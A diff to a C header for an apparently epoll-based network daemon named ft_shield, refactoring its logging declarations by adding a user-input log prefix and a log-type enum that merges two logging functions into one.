@@ -10,6 +10,7 @@
 #include <sys/file.h>
 #include <arpa/inet.h>
 #include <sys/epoll.h>
+#include <string.h>
 
 #define LOCK_FILE "/var/lock/ft_shield.lock"
 #define LOG_FILE "/var/log/ft_shield.log"
@@ -25,6 +26,12 @@
 #define LOG_EPOLL_FAILED "[ERROR]: connection failed (reason: failed to add to epoll)\n"
 #define LOG_DISCONNECT_USER "[INFO]: user disconnected\n"
 #define LOG_NEW_USER "[INFO]: new user connected\n"
+#define LOG_USER_INPUT "[INPUT]: "
+
+typedef enum {
+	LOG_INFO,
+	LOG_INPUT,
+} LOG_TYPE;
 
 typedef struct {
 	int fd;
@@ -33,6 +40,7 @@ typedef struct {
 } EPOLL_STRUCT;
 
 extern int userNb;
+extern EPOLL_STRUCT epoll;
 
 #define EPOLL_ERROR ((EPOLL_STRUCT){.fd = -1})
 
@@ -48,7 +56,6 @@ void disconnect_user(int userfd, EPOLL_STRUCT epoll);
 void read_input(int userfd, EPOLL_STRUCT epoll);
 
 void create_log();
-void log_event(char *log);
-void log_input(char *buffer, int userfd);
+void log_event(char *log, LOG_TYPE __TYPE__);
 
 #endif
